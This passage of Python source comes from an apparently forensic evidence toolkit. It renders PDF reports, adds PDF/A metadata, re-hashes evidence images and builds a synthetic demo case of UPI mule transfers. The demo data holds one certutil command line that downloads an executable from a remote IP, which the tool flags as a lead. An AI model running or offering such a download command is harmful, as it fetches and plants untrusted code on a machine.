                              initialFontName=fname["R"], initialFontSize=8, initialLeading=10)
        c.setTitle(meta["title"])
        c.setAuthor(meta["author"])
        c.setSubject(meta["subject"])
        c.setCreator(meta["creator"])
        c.setKeywords(meta["keywords"])
        outlines_by_page: Dict[int, List[str]] = {}
        for title, page in rec.outlines:
            outlines_by_page.setdefault(page, []).append(title)
        for pno, ops in enumerate(rec.pages, 1):
            for i, title in enumerate(outlines_by_page.get(pno, [])):
                key = f"p{pno}_{i}"
                c.bookmarkPage(key)
                c.addOutlineEntry(title, key, level=0)
            for op in ops:
                kind = op[0]
                if kind == "fill_rect":
                    _, x, y, w, h, col = op
                    c.setFillColorRGB(*_rgb(col))
                    c.rect(x, y, w, h, stroke=0, fill=1)
                elif kind == "stroke_rect":
                    _, x, y, w, h, col, lw = op
                    c.setLineWidth(lw)
                    c.setStrokeColorRGB(*_rgb(col))
                    c.rect(x, y, w, h, stroke=1, fill=0)
                elif kind == "line":
                    _, x1, y1, x2, y2, col, lw = op
                    c.setLineWidth(lw)
                    c.setStrokeColorRGB(*_rgb(col))
                    c.line(x1, y1, x2, y2)
                elif kind == "text":
                    _, x, y, s, key, size, col = op
                    c.setFont(fname[key], size)
                    c.setFillColorRGB(*_rgb(col))
                    c.drawString(x, y, s)
                elif kind == "qr":
                    _, x, y, m, matrix, col = op
                    c.saveState()
                    c.translate(x, y)
                    c.scale(m, m)
                    c.setFillColorRGB(*_rgb(col))
                    for cx, cy, ln in _qr_runs(matrix):
                        c.rect(cx, cy, ln, 1, stroke=0, fill=1)
                    c.restoreState()
            c.showPage()
        if rec.outlines:
            c.showOutline()
        c.save()
        injected = _pdfa_incremental_update(path, meta, pdfa)
        return {"engine": f"reportlab {getattr(sys.modules.get('reportlab'), 'Version', '')}".strip(),
                "pages": len(rec.pages), "fonts": self.fonts.describe(), "pdfa_catalog_update": injected}


def _pdfa_incremental_update(path: str, meta: Dict[str, Any], pdfa: bool) -> bool:
    """Append Metadata (XMP), OutputIntent and a matching Info dictionary as an incremental update."""
    with open(path, "rb") as f:
        data = f.read()
    sx = data.rfind(b"startxref")
    if sx < 0:
        return False
    prev = int(data[sx + 9:].split()[0])
    tpos = data.rfind(b"trailer", 0, sx)
    if tpos < 0:  # cross-reference stream: not handled
        return False
    trailer = data[tpos:sx]
    m_size = re.search(rb"/Size\s+(\d+)", trailer)
    m_root = re.search(rb"/Root\s+(\d+)\s+(\d+)\s+R", trailer)
    m_id = re.search(rb"/ID\s*\[\s*<([0-9A-Fa-f]+)>\s*<([0-9A-Fa-f]+)>\s*\]", trailer)
    if not (m_size and m_root):
        return False
    size, root = int(m_size.group(1)), int(m_root.group(1))
    m_obj = re.search(rb"(?:^|[\r\n])%d 0 obj\s*" % root, data)
    if not m_obj:
        return False
    start = data.find(b"<<", m_obj.end() - 1)
    depth, i = 0, start
    while i < len(data) - 1:
        two = data[i:i + 2]
        if two == b"<<":
            depth += 1
            i += 2
            continue
        if two == b">>":
            depth -= 1
            i += 2
            if depth == 0:
                break
            continue
        i += 1
    cat = data[start:i]
    cat = re.sub(rb"/Metadata\s+\d+\s+\d+\s+R", b"", cat)
    cat = re.sub(rb"/OutputIntents\s*\[[^\]]*\]", b"", cat)
    # The ICC profile and OutputIntent are written only for a PDF/A claim: no orphan objects otherwise.
    if pdfa:
        meta_id, icc_id, oi_id, info_id = size, size + 1, size + 2, size + 3
    else:
        meta_id, info_id = size, size + 1
    xmp = xmp_packet(meta, pdfa)
    extra = b" /Metadata %d 0 R" % meta_id + (b" /OutputIntents [%d 0 R]" % oi_id if pdfa else b"")
    new_cat = cat[:-2].rstrip() + extra + b" >>"
    objs = {
        root: new_cat,
        meta_id: b"<< /Type /Metadata /Subtype /XML /Length %d >>\nstream\n" % len(xmp) + xmp + b"\nendstream",
        info_id: _info_dict(meta),
    }
    if pdfa:
        icc = zlib.compress(srgb_icc_profile(), 9)
        objs[icc_id] = b"<< /N 3 /Length %d /Filter /FlateDecode >>\nstream\n" % len(icc) + icc + b"\nendstream"
        objs[oi_id] = (b"<< /Type /OutputIntent /S /GTS_PDFA1 /OutputConditionIdentifier (sRGB IEC61966-2.1) "
                       b"/Info (sRGB IEC61966-2.1) /DestOutputProfile %d 0 R >>" % icc_id)
    new_ids = sorted(n for n in objs if n != root)
    out = bytearray(data if data.endswith(b"\n") else data + b"\n")
    offsets = {}
    for num in sorted(objs):
        offsets[num] = len(out)
        out += b"%d 0 obj\n" % num + objs[num] + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 1\n0000000000 65535 f \n"
    out += b"%d 1\n%010d 00000 n \n" % (root, offsets[root])
    out += b"%d %d\n" % (meta_id, len(new_ids)) + b"".join(b"%010d 00000 n \n" % offsets[n] for n in new_ids)
    ids = (m_id.group(1), m_id.group(2)) if m_id else (hashlib.md5(data).hexdigest().encode(),) * 2
    out += (b"trailer\n<< /Size %d /Root %d 0 R /Info %d 0 R /ID [<%s> <%s>] /Prev %d >>\nstartxref\n%d\n%%%%EOF\n"
            % (size + len(new_ids), root, info_id, ids[0], ids[1], prev, xref))
    with open(path, "wb") as f:
        f.write(out)
    return True


def pdf_inspect(path: str) -> Dict[str, Any]:
    """Light structural read of a PDF this module wrote: pages, outlines, decoded page streams, QR rects."""
    with open(path, "rb") as f:
        data = f.read()
    info: Dict[str, Any] = {"bytes": len(data), "header": data[:8].decode("latin-1", "replace"),
                            "eof": data.rstrip().endswith(b"%%EOF")}
    objs: Dict[int, bytes] = {}
    for m in re.finditer(rb"(?:^|[\r\n])(\d+) 0 obj", data):
        end = data.find(b"endobj", m.end())
        objs[int(m.group(1))] = data[m.end():end]  # later revisions overwrite earlier ones
    pages = []
    for num, body in sorted(objs.items()):
        if re.search(rb"/Type\s*/Page(?![s\w])", body):
            mc = re.search(rb"/Contents\s+(\d+)\s+0\s+R", body)
            pages.append((num, int(mc.group(1)) if mc else None))
    info["page_count"] = len(pages)

    def stream_of(num: Optional[int]) -> bytes:
        body = objs.get(num or -1, b"")
        s = body.find(b"stream")
        if s < 0:
            return b""
        s += 6
        if body[s:s + 2] == b"\r\n":
            s += 2
        elif body[s:s + 1] in (b"\n", b"\r"):
            s += 1
        e = body.rfind(b"endstream")
        raw = body[s:e].rstrip(b"\r\n")
        if b"/ASCII85Decode" in body[:s]:
            a85 = re.sub(rb"\s", b"", raw)
            a85 = a85[2:] if a85.startswith(b"<~") else a85
            raw = base64.a85decode(a85[:-2] if a85.endswith(b"~>") else a85)
        if b"/FlateDecode" in body[:s] or b"/Fl " in body[:s]:
            try:
                return zlib.decompress(raw)
            except zlib.error:
                return zlib.decompressobj().decompress(raw)
        return raw

    info["page_streams"] = [stream_of(c) for _, c in pages]
    titles = []
    for num, body in sorted(objs.items()):
        mt = re.search(rb"/Title\s*\(((?:\\.|[^\\)])*)\)", body)
        if mt and (b"/Parent" in body and (b"/Dest" in body or b"/A " in body or b"/A<<" in body)):
            md = re.search(rb"/Dest\s*\[\s*(\d+)\s+0\s+R", body)
            page_obj = int(md.group(1)) if md else None
            pidx = next((i + 1 for i, (pn, _) in enumerate(pages) if pn == page_obj), None)
            titles.append((mt.group(1).decode("latin-1"), pidx))
    info["outlines"] = titles
    cat = next((b for b in objs.values() if re.search(rb"/Type\s*/Catalog", b)), b"")
    info["has_xmp"] = b"/Metadata" in cat
    info["has_output_intent"] = b"/OutputIntents" in cat
    info["pdfaid"] = b"pdfaid:part>1<" in data
    info["fonts_embedded"] = all(
        (b"/FontFile2" in b or b"/FontFile" in b) for b in objs.values() if re.search(rb"/Type\s*/FontDescriptor", b)
    ) and not re.search(rb"/Subtype\s*/Type1\s*/BaseFont\s*/(Helvetica|Courier|Times)", data)
    info["has_id"] = b"/ID" in data[data.rfind(b"trailer"):]
    info["temp_refs"] = re.findall(rb"temp[\w]*\.png", data)
    return info


def extract_qr_from_page(stream: bytes) -> Optional[List[List[bool]]]:
    """Rebuild the QR module matrix from the vector runs in a page content stream."""
    toks = stream.decode("latin-1", "replace").split()
    for i in range(len(toks) - 6):
        if toks[i + 6] == "cm" and toks[i + 1] == "0" and toks[i + 2] == "0" and toks[i] == toks[i + 3] \
                and toks[i] not in ("1", "0"):
            runs, j = [], i + 7
            while j < len(toks) and toks[j] != "Q":
                if toks[j] == "re" and j >= 4:
                    try:
                        runs.append(tuple(int(float(t)) for t in toks[j - 4:j]))
                    except ValueError:
                        pass
                j += 1
            if not runs:
                continue
            n = max(r[1] for r in runs) + 1
            n = max(n, max(r[0] + r[2] for r in runs))
            grid = [[False] * n for _ in range(n)]
            for cx, cy, ln, _h in runs:
                for k in range(ln):
                    grid[n - 1 - cy][cx + k] = True
            return grid
    return None


# --------------------------------------------------------------------------- #
# Independent re-hashing of Sector A evidence (same formulas as Sector A)     #
# --------------------------------------------------------------------------- #

def _leaf(data: bytes) -> bytes:
    return hashlib.sha256(b"\x00" + data).digest()


def _merkle_root(nodes: Sequence[bytes]) -> bytes:
    """RFC 6962 node = SHA-256(0x01||L||R); an unpaired last node is promoted (as Sector A)."""
    if not nodes:
        return hashlib.sha256(b"").digest()
    level = list(nodes)
    while len(level) > 1:
        nxt = [hashlib.sha256(b"\x01" + level[i] + level[i + 1]).digest() for i in range(0, len(level) - 1, 2)]
        if len(level) % 2:
            nxt.append(level[-1])
        level = nxt
    return level[0]


def bound_root(merkle_root_hex: str, video_sha_hex: Optional[str]) -> str:
    video = bytes.fromhex(video_sha_hex) if video_sha_hex else bytes(32)
    return hashlib.sha256(bytes.fromhex(merkle_root_hex) + video).hexdigest()


class _Source:
    """Evidence bytes from a path (read-only, streamed) or from memory."""

    def __init__(self, src: Union[str, bytes, bytearray, None], label: str = ""):
        self.src = src
        self.label = label or (os.path.basename(src) if isinstance(src, str) else "in-memory")

    @property
    def available(self) -> bool:
        return isinstance(self.src, (bytes, bytearray)) or (isinstance(self.src, str) and os.path.isfile(self.src))

    def size(self) -> int:
        if isinstance(self.src, (bytes, bytearray)):
            return len(self.src)
        return os.path.getsize(self.src)  # type: ignore[arg-type]

    def read(self, off: int, length: int) -> bytes:
        if isinstance(self.src, (bytes, bytearray)):
            return bytes(self.src[off:off + length])
        flags = os.O_RDONLY | getattr(os, "O_BINARY", 0)
        fd = os.open(self.src, flags)  # type: ignore[arg-type]
        try:
            out = bytearray()
            os.lseek(fd, off, os.SEEK_SET)
            while len(out) < length:
                blk = os.read(fd, min(4 * 1024 * 1024, length - len(out)))
                if not blk:
                    break
                out += blk
            return bytes(out)
        finally:
            os.close(fd)

    def sha256(self) -> str:
        h = hashlib.sha256()
        size, pos = self.size(), 0
        while pos < size:
            blk = self.read(pos, 4 * 1024 * 1024)
            h.update(blk)
            pos += len(blk)
        return h.hexdigest()


def rehash_evidence(src: _Source, bad_sectors: Sequence[int] = (), sector_size: int = SECTOR_SIZE,
                    fill: bytes = b"\xDE\xAD\xBE\xEF") -> Dict[str, Any]:
    """
    Recompute Sector A's digests from the evidence: known-bad sectors are not read but replaced
    by the recorded fill pattern, exactly as Sector A acquired them.
    """
    size = src.size()
    bad = set(int(b) for b in bad_sectors)
    pattern = (fill * (sector_size // len(fill) + 1))[:sector_size]
    lin, valid, b2b = hashlib.sha256(), hashlib.sha256(), hashlib.blake2b()
    chunk_roots: List[bytes] = []
    for off in range(0, size, CHUNK_SIZE):
        length = min(CHUNK_SIZE, size - off)
        first, last = off // sector_size, (off + length - 1) // sector_size
        chunk_bad = sorted(s for s in range(first, last + 1) if s in bad)
        if not chunk_bad:
            data = src.read(off, length)
            spans = [(0, length)]
        else:
            buf = bytearray(length)
            cursor = off
            spans = []
            for s in chunk_bad + [None]:
                stop = off + length if s is None else max(s * sector_size, off)
                if stop > cursor:
                    buf[cursor - off:stop - off] = src.read(cursor, stop - cursor)
                    spans.append((cursor - off, stop - off))
                if s is not None:
                    b0, b1 = max(s * sector_size, off) - off, min((s + 1) * sector_size, off + length) - off
                    buf[b0:b1] = pattern[:b1 - b0]
                    cursor = off + b1
            data = bytes(buf)
        if len(data) != length:
            raise IOError(f"evidence ended early at byte {off + len(data)}")
        lin.update(data)
        b2b.update(data)
        mv = memoryview(data)
        for a, b in spans:
            valid.update(mv[a:b])
        chunk_roots.append(_merkle_root([_leaf(data[i:i + SUB_BLOCK]) for i in range(0, len(data), SUB_BLOCK)]))
    return {"size": size, "sha256_linear": lin.hexdigest(), "sha256_valid": valid.hexdigest(),
            "blake2b": b2b.hexdigest(), "chunk_roots": [c.hex() for c in chunk_roots],
            "merkle_root": _merkle_root(chunk_roots).hex()}


def evidence_view(m: Dict[str, Any]) -> Dict[str, Any]:
    """Normalise a Sector A manifest (current r2 layout, or the older flat demo layout)."""
    h = m.get("cryptographic_hashes") or {}
    media = m.get("evidence_media") or {}
    algs = m.get("hash_algorithms") or {}
    bsm = m.get("bad_sector_manifest") or {}
    bnss = m.get("bnss_verification") or {}
    tree_alg = algs.get("secondary_tree_hash")
    tree = h.get("blake3_root_dag") if tree_alg == "blake3" else h.get("blake2s_256_fallback") if tree_alg else None
    anchor = m.get("rfc3161_time_anchor") or {}
    return {
        "evidence_id": m.get("evidence_id"), "case": m.get("case_reference"), "examiner": m.get("examiner_id"),
        "workstation": m.get("ingestion_workstation"), "ingested_utc": m.get("ingestion_timestamp_utc"),
        "filename": media.get("filename") or m.get("evidence_filename"),
        "size": media.get("size_bytes", m.get("file_size_bytes")),
        "telemetry": media.get("hardware_telemetry") or {},
        "sha256": h.get("sha256_linear_primary") or h.get("sha256_primary"),
        "sha256_valid": h.get("sha256_piecewise_valid_extent"),
        "blake2b": h.get("blake2b_secondary"),
        "tree_alg": tree_alg, "tree": tree,
        "merkle_root": h.get("sha256_merkle_root_4mb") or h.get("merkle_root"),
        "video_sha": h.get("bnss_105_seizure_video_sha256"),
        "bound_root": h.get("final_bound_evidence_root"),
        "master_root": h.get("master_case_root_v3"),
        "chunk_roots": (m.get("merkle_tree") or {}).get("chunk_roots"),
        "bad_sectors": list(bsm.get("bad_sectors") or []),
        "bad_byte_offsets": list(bsm.get("bad_byte_offsets") or []),
        "bad_manifest": bsm or None,
        "sector_size": int(bsm.get("sector_size_bytes") or SECTOR_SIZE),
        "fill": bytes.fromhex(str(bsm.get("fill_pattern", "0xDEADBEEF"))[2:]) if str(
            bsm.get("fill_pattern", "0xDEADBEEF")).startswith("0x") else b"\xDE\xAD\xBE\xEF",
        "video_check": bnss.get("sec_105_video_continuity"),
        "custody": bnss.get("sec_106_malkhana_seal_ledger"),
        "tsa_token": m.get("rfc3161_timestamp_token") or anchor.get("tsr_base64"),
        "tsa_status": anchor.get("status") or ("TOKEN RECORDED" if m.get("rfc3161_timestamp_token") else
                                               "NOT RECORDED"),
        "tsa_imprint": anchor.get("message_imprint_sha256"),
        "admissibility": m.get("admissibility") or {},
        "manifest_digest": m.get("manifest_canonical_sha256"),
        "version": m.get("version"),
        "full_layout": bool(m.get("merkle_tree") and m.get("hash_algorithms")),
    }


def _anchor_iter(obj: Any, path: str = "") -> Iterable[Tuple[str, Dict[str, Any]]]:
    """Every dict that is a byte anchor: has byte_offset, length and sha256."""
    if isinstance(obj, dict):
        if {"byte_offset", "length", "sha256"} <= set(obj) and isinstance(obj.get("byte_offset"), int):
            yield path, obj
        for k, v in obj.items():
            if k in ("provenance_note",):
                continue
            yield from _anchor_iter(v, f"{path}.{k}" if path else k)
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            yield from _anchor_iter(v, f"{path}[{i}]")


# --------------------------------------------------------------------------- #
# Built-in demonstration case: a small evidence image generated in memory,    #
# with Sector A, B and C documents computed from its bytes                    #
# --------------------------------------------------------------------------- #

_DEMO_CACHE: Dict[str, Any] = {}

_DEMO_UPI = [
    ("T1", "2026-10-14T06:15:00.000Z", "rahul@okhdfc", "hub.kyc@ybl", "YESB0000001", 250000.00, "628711000101"),
    ("T2", "2026-10-14T06:15:20.000Z", "hub.kyc@ybl", "mule1@ybl", "YESB0000101", 62000.00, "628711000102"),
    ("T3", "2026-10-14T06:15:41.000Z", "hub.kyc@ybl", "mule2@paytm", "PYTM0123456", 61500.00, "628711000103"),
    ("T4", "2026-10-14T06:16:02.000Z", "hub.kyc@ybl", "mule3@okaxis", "UTIB0000123", 60000.00, "628711000104"),
    ("T5", "2026-10-14T06:16:20.000Z", "hub.kyc@ybl", "mule4@ibl", "INDB0000456", 61500.00, "628711000105"),
    ("T6", "2026-10-14T06:20:00.000Z", "mule2@paytm", "p2p.trader@ybl", "YESB0000202", 59000.00, "628711000106"),
    ("T7", "2026-10-14T06:21:00.000Z", "mule3@okaxis", "cash.drop@ibl", "INDB0000789", 1500.00, "628740000107"),
]
_DEMO_CHECKS = [
    ("C01_SESSION_LOGON_TYPE", "Command ran in a local interactive desktop session", "SUPPORTS_ATTRIBUTION"),
    ("C02_NO_REMOTE_TOOL_PROCESS", "No remote-access tool process in the prior 24 h", "SUPPORTS_ATTRIBUTION"),
    ("C03_NO_RDP_LOGON", "No RemoteInteractive (type 10) logon in the prior 24 h", "SUPPORTS_ATTRIBUTION"),
    ("C04_NO_REMOTE_SESSION_TRACE", "No inbound remote-desktop connection trace in the prior 24 h",
     "SUPPORTS_INTRUSION_HYPOTHESIS"),
    ("C05_NO_EXTERNAL_NETWORK_LOGON", "No network logon (type 3) from a public IP in the prior 24 h",
     "SUPPORTS_ATTRIBUTION"),
    ("C06_USER_IS_DEVICE_OWNER", "Account that ran the command is the device owner's", "SUPPORTS_ATTRIBUTION"),
    ("C07_NO_NEW_SERVICE", "No service installed within 24 h either side", "SUPPORTS_ATTRIBUTION"),
    ("C08_NO_NEW_SCHEDULED_TASK", "No scheduled task created within 24 h either side", "SUPPORTS_ATTRIBUTION"),
    ("C09_NO_AV_TAMPERING", "No anti-virus protection disabled within 24 h either side", "SUPPORTS_ATTRIBUTION"),
    ("C10_NO_LOG_CLEARING", "No audit log cleared within 24 h either side", "SUPPORTS_ATTRIBUTION"),
    ("C11_NO_ACCOUNT_CHANGES", "No account created or added to a privileged group", "SUPPORTS_ATTRIBUTION"),
    ("C12_NO_CLOCK_TAMPERING", "No system time change within 24 h either side", "SUPPORTS_ATTRIBUTION"),
    ("C13_DESKTOP_LINEAGE", "Process tree leads back to the desktop shell", "UNDETERMINED"),
    ("C14_NO_ANOMALOUS_PARENT", "No anomalous parent-child relationship for the command",
     "SUPPORTS_INTRUSION_HYPOTHESIS"),
]


def _demo_bytes(n: int, seed: bytes) -> bytes:
    out, i = bytearray(), 0
    while len(out) < n:
        out += hashlib.sha256(seed + i.to_bytes(8, "big")).digest()
        i += 1
    return bytes(out[:n])


def demo_case() -> Dict[str, Any]:
    """The built-in case: evidence image, seizure recording bytes and Sector A/B/C documents."""
    if _DEMO_CACHE:
        return _DEMO_CACHE
    case = "FIR-042/2026-CYBER"
    filename = "demo_handset_image.raw"
    events = (b'{"EventID":1,"UtcTime":"2026-10-14 06:10:05.000","User":"rahul","ParentImage":"cmd.exe",'
              b'"Image":"certutil.exe","CommandLine":"certutil.exe -urlcache -split -f http://185.220.101.5/a.exe '
              b'C:\\\\Users\\\\Public\\\\a.exe"}\n')
    upi = b"txn_id,timestamp_utc,payer_vpa,payee_vpa,payee_ifsc,amount_inr,rrn\n" + b"".join(
        f"{t},{ts},{a},{b},{ifsc},{amt:.2f},{rrn}\n".encode() for t, ts, a, b, ifsc, amt, rrn in _DEMO_UPI)
    chain = (b"tx_hash,chain,timestamp_utc,from_address,to_address,amount_usdt\n"
             b"0x7f3c1e,TRON,2026-10-14T06:22:00.000Z,TQ5p2pDeskWallet,TXmuleExitWallet,665.20\n")
    image = bytearray(b"SUTRA-TRACE BUILT-IN DEMONSTRATION EVIDENCE IMAGE (synthetic; not case data)\n")
    layout: Dict[str, Tuple[int, int]] = {}
    for name, blob in (("events", events), ("upi", upi), ("chain", chain)):
        pos = (len(image) + 4095) // 4096 * 4096
        image += _demo_bytes(pos - len(image), b"pad" + name.encode())
        layout[name] = (pos, len(blob))
        image += blob
    image += _demo_bytes(1024 * 1024 + 3000 - len(image), b"slack")
    image = bytes(image)
    video = b"\x00\x00\x00\x18ftypisom\x00\x00\x02\x00isomiso2" + _demo_bytes(48 * 1024, b"sec105-recording")

    rh = rehash_evidence(_Source(image))
    video_sha = _sha256_hex(video)
    a: Dict[str, Any] = {
        "version": "SUTRA-VAULT-DEMO (built into Sector D)",
        "evidence_id": str(uuid.uuid5(uuid.NAMESPACE_URL, "sutra-trace/demo/" + _sha256_hex(image))),
        "case_reference": case, "examiner_id": "EX-79A-NFSU", "ingestion_workstation": "LEA-FORENSIC-WS01",
        "ingestion_timestamp_utc": "2026-10-15T11:40:00.000Z",
        "evidence_media": {"filename": filename, "size_bytes": rh["size"],
                           "total_chunks_4mb": len(rh["chunk_roots"]), "acquired_image": None,
                           "hardware_telemetry": {"make_model": "Android handset (demonstration)",
                                                  "serial_number": "DEMO-SN-0001", "imei": "356789104512347",
                                                  "colour": "Black", "firmware_rev": "DEMO"}},
        "cryptographic_hashes": {
            "sha256_linear_primary": rh["sha256_linear"], "sha256_piecewise_valid_extent": rh["sha256_valid"],
            "blake2b_secondary": rh["blake2b"], "blake3_root_dag": None, "blake2s_256_fallback": None,
            "sha256_merkle_root_4mb": rh["merkle_root"], "bnss_105_seizure_video_sha256": video_sha,
            "final_bound_evidence_root": bound_root(rh["merkle_root"], video_sha),
            "fir_sha256": _sha256_hex(case.encode()), "navic_clock_sha256": None, "master_case_root_v3": None},
        "hash_algorithms": {"secondary_tree_hash": None, "blake2b_secondary": "blake2b-512",
                            "merkle": "RFC 6962: leaf=SHA-256(0x00||1KB sub-block), node=SHA-256(0x01||L||R), "
                                      "unpaired node promoted",
                            "bound_root": "SHA-256(merkle_root || video_sha256 or 32 zero bytes)"},
        "merkle_tree": {"chunk_size_bytes": CHUNK_SIZE, "sub_block_bytes": SUB_BLOCK,
                        "chunk_roots": rh["chunk_roots"]},
        "bad_sector_manifest": {"sector_size_bytes": SECTOR_SIZE, "fill_pattern": "0xDEADBEEF", "bad_sectors": [],
                                "bad_byte_offsets": []},
        "bnss_verification": {
            "sec_105_video_continuity": {"verified": True, "findings": [], "audio_decoder": "demonstration"},
            "sec_106_malkhana_seal_ledger": {"malkhana_register_receipt": "MK-CY-2026/089",
                                             "malkhana_deposit_utc": "2026-10-15T09:30:00.000Z",
                                             "lab_unseal_verified": True, "signatures": {}}},
        "rfc3161_timestamp_token": None,
        "rfc3161_time_anchor": {"status": "NOT_ANCHORED (demonstration case; no TSA configured)"},
        "statutory_compliance": {"evidence_statute": LAW["sec63"], "search_seizure_statute": LAW["bnss105"]},
        "admissibility": {"status": "PROVISIONAL", "blocking_issues": [],
                          "warnings": ["RFC 3161: NOT_ANCHORED (demonstration case)"]},
    }
    a["bad_sector_manifest"]["manifest_sha256"] = _sha256_hex(canonical_json_a(
        {k: v for k, v in a["bad_sector_manifest"].items() if k != "manifest_sha256"}))
    a["manifest_canonical_sha256"] = _sha256_hex(canonical_json_a(a))

    def anchor(name: str, rel: int, length: int, source_type: str, **extra: Any) -> Dict[str, Any]:
        off = layout[name][0] + rel
        d = {"artifact_id": name, "byte_offset": off, "file_path": filename, "length": length,
             "offset_basis": "ABSOLUTE_IN_FILE", "sha256": _sha256_hex(image[off:off + length]),
             "source_type": source_type}
        d.update(extra)
        return d

    rows, rel = {}, upi.index(b"\n") + 1
    for line in upi.split(b"\n")[1:-1]:
        rows[line.split(b",")[0].decode()] = (rel, len(line))
        rel += len(line) + 1

    def txn(t: str) -> Dict[str, Any]:
        r = next(x for x in _DEMO_UPI if x[0] == t)
        return {"txn_id": r[0], "timestamp_utc": r[1], "payer_vpa": r[2], "payee_vpa": r[3], "payee_ifsc": r[4],
                "amount_inr": r[5], "rrn": r[6]}

    def upi_anchor(t: str) -> Dict[str, Any]:
        return anchor("upi", rows[t][0], rows[t][1], "UPI_TRANSACTION_EXPORT", txn_id=t)

    ev_len = len(events) - 1
    chain_rel = chain.index(b"\n") + 1
    chain_anchor = anchor("chain", chain_rel, len(chain) - chain_rel - 1, "BLOCKCHAIN_TRANSFER_EXPORT",
                          txn_id="0x7f3c1e")
    checks = [{"check": c, "question": q, "result": r} for c, q, r in _DEMO_CHECKS]
    det = sum(1 for c in checks if c["result"] != "UNDETERMINED")
    intr = sum(1 for c in checks if c["result"] == "SUPPORTS_INTRUSION_HYPOTHESIS")
    s45 = {"checks": checks, "checks_evaluated": len(checks), "checks_determined": det,
           "supports_attribution": det - intr, "supports_intrusion_hypothesis": intr,
           "trojan_defense_probability": round(intr / det, 4),
           "method_note": "trojan_defense_probability = checks supporting intrusion / checks determined; a "
                          "transparent ratio for the examiner, not a calibrated likelihood.",
           "statute": "Section 45, Bharatiya Sakshya Adhiniyam, 2023 - grounds of the expert's opinion"}
    leads = [
        {"lead_id": "LEAD-B-LOG-001", "threat_category": "LOLBINS_COMMAND", "severity": "HIGH",
         "threat_score": 0.8959, "mitre_technique": "T1105 - Ingress Tool Transfer",
         "symbolic_anchor": anchor("events", 0, ev_len, "SYSMON_EVENT_LOG_JSONL"),
         "lead_details": {"image": "certutil.exe", "user": "rahul", "timestamp_utc": "2026-10-14T06:10:05.000Z"}},
        {"lead_id": "LEAD-B-FIN-002", "threat_category": "RAPID_UPI_SMURFING", "severity": "HIGH",
         "threat_score": 0.8956, "symbolic_anchor": upi_anchor("T1"),
         "lead_details": {"alert": "RAPID_FAN_OUT_SMURFING", "hub_vpa": "hub.kyc@ybl", "dispersal_span_s": 80.0,
                          "flagged_mules": ["mule1@ybl", "mule2@paytm", "mule3@okaxis", "mule4@ibl"],
                          "inflow": txn("T1"), "outflows": [txn(t) for t in ("T2", "T3", "T4", "T5")],
                          "row_anchors": [upi_anchor(t) for t in ("T1", "T2", "T3", "T4", "T5")]}},
        {"lead_id": "LEAD-B-FIN-003", "threat_category": "CROSS_CHAIN_BRIDGE", "severity": "HIGH",
         "threat_score": 0.8676, "symbolic_anchor": upi_anchor("T6"),
         "lead_details": {"alert": "CROSS_CHAIN_BRIDGE_MATCH", "upi": txn("T6"), "delta_t_s": 120.0,
                          "chain": {"chain": "TRON", "tx_hash": "0x7f3c1e", "from_address": "TQ5p2pDeskWallet",
                                    "to_address": "TXmuleExitWallet", "amount_usdt": 665.2,
                                    "timestamp_utc": "2026-10-14T06:22:00.000Z"},
                          "chain_anchor": chain_anchor}},
        {"lead_id": "LEAD-B-FIN-004", "threat_category": "INVALID_NPCI_RRN", "severity": "MEDIUM",
         "threat_score": 0.55, "symbolic_anchor": upi_anchor("T7"),
         "lead_details": {"transaction": txn("T7"),
                          "rrn_validation": {"rrn": "628740000107", "valid": False, "reasons": ["Hour 40 > 23"]}}},
    ]
    b: Dict[str, Any] = {
        "version": "SUTRA-TRIAGE-DEMO (built into Sector D)", "case_id": case,
        "triage_timestamp_utc": "2026-10-15T12:05:00.000Z",
        "sector_a_binding": {"evidence_id": a["evidence_id"], "case_reference": case, "evidence_filename": filename,
                             "sha256_linear_primary": rh["sha256_linear"], "master_case_root_v3": None,
                             "admissibility_status": "PROVISIONAL"},
        "summary_metrics": {"total_telemetry_events_scanned": 9, "high_priority_leads_flagged": 3,
                            "total_leads": len(leads), "exculpatory_checks_evaluated": s45["checks_evaluated"],
                            "trojan_defense_probability": s45["trojan_defense_probability"]},
        "artifact_errors": [], "symbolic_anchors": leads, "section45_exculpatory_checklist": s45,
    }
    b["manifest_sha256"] = _sha256_hex(canonical_json(b))

    def step(i: int, stage: int, stage_name: str, actor: str, action: str, target: str, ts: str,
             anc: Dict[str, Any], lead: str) -> Dict[str, Any]:
        return {"step": i, "stage": stage, "stage_name": stage_name, "actor": actor, "action": action,
                "target": target, "narrative": f"{actor} {action} {target}", "timestamp_utc": ts,
                "timestamp_basis": "AS_RECORDED", "lead_id": lead,
                "provenance": {"source_file": filename, "byte_offset": anc["byte_offset"], "length": anc["length"],
                               "sha256": anc["sha256"], "source_type": anc["source_type"],
                               "offset_basis": "ABSOLUTE_IN_FILE", "hash_algorithm": "SHA-256",
                               "sector_a_evidence_id": a["evidence_id"], "anchor_reverified": True}}

    fin = "Financial Exfiltration & Multi-Tier Layering"
    steps = [step(1, 2, "Execution", "rahul", "ran certutil download from", "185.220.101.5",
                  "2026-10-14T06:10:05.000Z", leads[0]["symbolic_anchor"], "LEAD-B-LOG-001")]
    steps.append(step(2, 4, fin, "rahul@okhdfc", "paid INR 2,50,000.00 to", "hub.kyc@ybl", _DEMO_UPI[0][1],
                      upi_anchor("T1"), "LEAD-B-FIN-002"))
    for k, t in enumerate(("T2", "T3", "T4", "T5"), 3):
        r = txn(t)
        steps.append(step(k, 4, fin, "hub.kyc@ybl", f"moved {_fmt_inr(r['amount_inr'])} to", r["payee_vpa"],
                          r["timestamp_utc"], upi_anchor(t), "LEAD-B-FIN-002"))
    steps.append(step(7, 4, fin, "mule2@paytm", "paid INR 59,000.00 to", "p2p.trader@ybl", _DEMO_UPI[5][1],
                      upi_anchor("T6"), "LEAD-B-FIN-003"))
    steps.append(step(8, 4, fin, "TQ5p2pDeskWallet", "sent 665.20 USDT (TRON) to", "TXmuleExitWallet",
                      "2026-10-14T06:22:00.000Z", chain_anchor, "LEAD-B-FIN-003"))
    c: Dict[str, Any] = {
        "schema": "SUTRA-STORYLINE/1", "version": "SUTRA-GRAPH-DEMO (built into Sector D)", "case_id": case,
        "generated_utc": "2026-10-15T12:30:00.000000000Z",
        "sector_a_binding": {"evidence_id": a["evidence_id"], "case_reference": case, "evidence_filename": filename,
                             "manifest_canonical_sha256": a["manifest_canonical_sha256"], "bad_sectors": []},
        "sector_b_binding": {"case_id": case, "manifest_sha256": b["manifest_sha256"], "leads": len(leads)},
        "stages": [{"stage": 2, "name": "Execution", "steps": [1]},
